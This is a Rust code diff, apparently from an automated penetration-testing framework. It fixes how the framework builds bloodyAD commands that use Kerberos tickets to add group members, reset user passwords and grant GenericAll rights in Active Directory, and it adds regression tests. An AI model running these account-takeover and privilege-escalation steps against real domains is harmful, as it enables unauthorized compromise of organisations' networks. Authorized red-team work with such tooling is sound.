@@ -47,16 +47,24 @@ pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
     let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
     let cmd = if let Some(tpath) = ticket_path {
+        // bloodyAD's `-k` is variadic (`nargs='*'`). It accepts keyword
+        // arguments like `ccache=/path/x.ccache`; there is NO `-K` flag.
+        // Passing `-k -K <path>` made argparse consume `-K` as an unknown
+        // token, then `<path>` landed in the subcommand slot and bloodyAD
+        // rejected the entire call with "invalid choice: '<path>'". Use
+        // the documented `ccache=<path>` form and keep KRB5CCNAME as a
+        // belt-and-braces env fallback.
         CommandBuilder::new("bloodyAD")
             .flag("-d", domain)
             .flag("--host", dc_ip)
             .arg("-k")
-            .flag("-K", tpath.to_string())
+            .arg(format!("ccache={tpath}"))
             .arg("add")
             .arg("groupMember")
             .arg(group)
             .arg(target_user)
             .env("KRB5CCNAME", tpath)
+            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"))
             .timeout_secs(60)
     } else {
         let username = required_str(args, "username")?;
@@ -96,19 +104,22 @@ pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
     let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
     let cmd = if let Some(tpath) = ticket_path {
-        // Kerberos mode: bloodyAD -d <domain> --host <dc_ip> -k -K <ccache>
+        // Kerberos mode: `bloodyAD -d <d> --host <ip> -k ccache=<path> set …`.
+        // `-K` isn't a real bloodyAD flag — see comment in
+        // build_bloodyad_add_group_member. KRB5CCNAME env is set as a
+        // fallback; recent bloodyAD versions read it even when `ccache=`
+        // is provided.
         CommandBuilder::new("bloodyAD")
             .flag("-d", domain)
             .flag("--host", dc_ip)
             .arg("-k")
-            .flag("-K", tpath.to_string())
+            .arg(format!("ccache={tpath}"))
             .arg("set")
             .arg("password")
             .arg(target_user)
             .arg(new_password)
-            // KRB5CCNAME must also be set as an env var; some bloodyAD
-            // versions read it even when -K is passed.
             .env("KRB5CCNAME", tpath)
+            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"))
             .timeout_secs(60)
     } else {
         let username = required_str(args, "username")?;
@@ -147,16 +158,19 @@ pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
     let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
 
     let cmd = if let Some(tpath) = ticket_path {
+        // See build_bloodyad_add_group_member for why `-k ccache=<path>` and
+        // not `-k -K <path>`.
         CommandBuilder::new("bloodyAD")
             .flag("-d", domain)
             .flag("--host", dc_ip)
             .arg("-k")
-            .flag("-K", tpath.to_string())
+            .arg(format!("ccache={tpath}"))
             .arg("add")
             .arg("genericAll")
             .arg(target_dn)
             .arg(principal)
             .env("KRB5CCNAME", tpath)
+            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"))
             .timeout_secs(60)
     } else {
         let username = required_str(args, "username")?;
@@ -1226,7 +1240,19 @@ mod tests {
         );
         let args_vec = cmd.args_for_test();
         assert!(args_vec.iter().any(|a| a == "-k"), "expected -k flag");
-        assert!(args_vec.iter().any(|a| a == "-K"), "expected -K flag");
+        // bloodyAD's `-k` is variadic; the ccache reaches it as `ccache=<path>`.
+        // `-K` is NOT a valid bloodyAD arg — regression guard against the
+        // wedge that corrupted argv into an "invalid choice" subcommand error.
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "ccache=/tmp/ares-tickets/contoso__fabrikam__Administrator.ccache"),
+            "expected `-k ccache=<path>` form; got args: {args_vec:?}"
+        );
+        assert!(
+            !args_vec.iter().any(|a| a == "-K"),
+            "`-K` is not a real bloodyAD flag; must not appear in argv"
+        );
     }
 
     #[test]
@@ -1245,9 +1271,21 @@ mod tests {
                 .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/x.ccache"),
             "ticket_path must export KRB5CCNAME for bloodyad_add_group_member"
         );
+        let args_vec = cmd.args_for_test();
         assert!(
-            cmd.args_for_test().iter().any(|a| a == "-k"),
+            args_vec.iter().any(|a| a == "-k"),
             "expected bloodyAD -k flag for Kerberos auth"
+        );
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "ccache=/tmp/ares-tickets/x.ccache"),
+            "expected `-k ccache=<path>` (bloodyAD's variadic keyword form), \
+             not `-K <path>` which bloodyAD rejects"
+        );
+        assert!(
+            !args_vec.iter().any(|a| a == "-K"),
+            "`-K` is not a real bloodyAD flag"
         );
     }
 
@@ -1292,7 +1330,18 @@ mod tests {
                 .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/y.ccache"),
             "ticket_path must export KRB5CCNAME for bloodyad_add_genericall"
         );
-        assert!(cmd.args_for_test().iter().any(|a| a == "-k"));
+        let args_vec = cmd.args_for_test();
+        assert!(args_vec.iter().any(|a| a == "-k"));
+        assert!(
+            args_vec
+                .iter()
+                .any(|a| a == "ccache=/tmp/ares-tickets/y.ccache"),
+            "expected `-k ccache=<path>`; got args: {args_vec:?}"
+        );
+        assert!(
+            !args_vec.iter().any(|a| a == "-K"),
+            "`-K` is not a real bloodyAD flag"
+        );
     }
 
     // ── Bug E: etype_hint consumption ───────────────────────────────────
